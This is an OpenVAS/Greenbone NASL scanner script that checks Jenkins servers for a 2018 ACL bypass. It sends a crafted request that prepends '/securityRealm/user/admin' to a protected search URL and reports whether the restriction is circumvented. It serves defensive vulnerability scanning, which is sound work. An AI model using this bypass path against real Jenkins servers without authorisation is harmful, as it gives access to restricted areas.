# Copyright (C) 2019 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:jenkins:jenkins";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108591");
  script_version("2019-06-03T14:03:05+0000");
  script_tag(name:"last_modification", value:"2019-06-03 14:03:05 +0000 (Mon, 03 Jun 2019)");
  script_tag(name:"creation_date", value:"2019-06-03 12:16:09 +0000 (Mon, 03 Jun 2019)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Jenkins < 2.121.3 / < 2.138 ACL Bypass Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("sw_jenkins_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("jenkins/installed");

  script_tag(name:"summary", value:"Jenkins is prone to an ACL bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to bypass the ACL policy of Jenkins via a crafted HTTP GET request.");

  script_tag(name:"impact", value:"By prepending '/securityRealm/user/admin' to specific URLs an attacker is able to
  bypass the ACL configuration of Jenkins and to access restricted areas on the remote application.");

  script_tag(name:"affected", value:"Jenkins weekly up to and including 2.137, Jenkins LTS up to and including 2.121.2.");

  script_tag(name:"solution", value:"Upgrade Jenkins weekly to 2.138 or later / Jenkins LTS to 2.121.3 or later.");

  script_xref(name:"URL", value:"https://jenkins.io/security/advisory/2018-08-15/");
  script_xref(name:"URL", value:"https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

# nb: Anonymous read already enabled, can't check for the ACL bypass
if( get_kb_item( "jenkins/" + port + "/" + dir + "/anonymous_read_enabled" ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

# Double check to make sure that we don't have access to this URL to avoid possible false positives
base_url = "/search/index?q=a";
check_url = dir + base_url;

req = http_get( port:port, item:check_url );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( ! buf || buf =~ "^HTTP/[0-9]([.][0-9]+)? 200" || buf !~ "^HTTP/[0-9]([.][0-9]+)? 403" || "<title>Search for" >< buf )
  exit( 0 );

# nb: This works with any user, even non-existent ones.
# nb: Jenkins seems to respond with a 404 status code even if the search worked.
bypass_url = dir + "/securityRealm/user/admin" + base_url;

req = http_get( port:port, item:bypass_url );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( buf && buf =~ "^HTTP/[0-9]([.][0-9]+)? " && ( "<title>Search for 'a'" >< buf || ">Nothing seems to match.<" >< buf ) ) {
  report  = 'By accessing "' + report_vuln_url( port:port, url:check_url, url_only:TRUE ) + '" it was possible to verify that the page is protected via an ACL policy.\n';
  report += 'By accessing "' + report_vuln_url( port:port, url:bypass_url, url_only:TRUE ) + '" it was possible to circumvent this protection and run a search on the target host.';
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );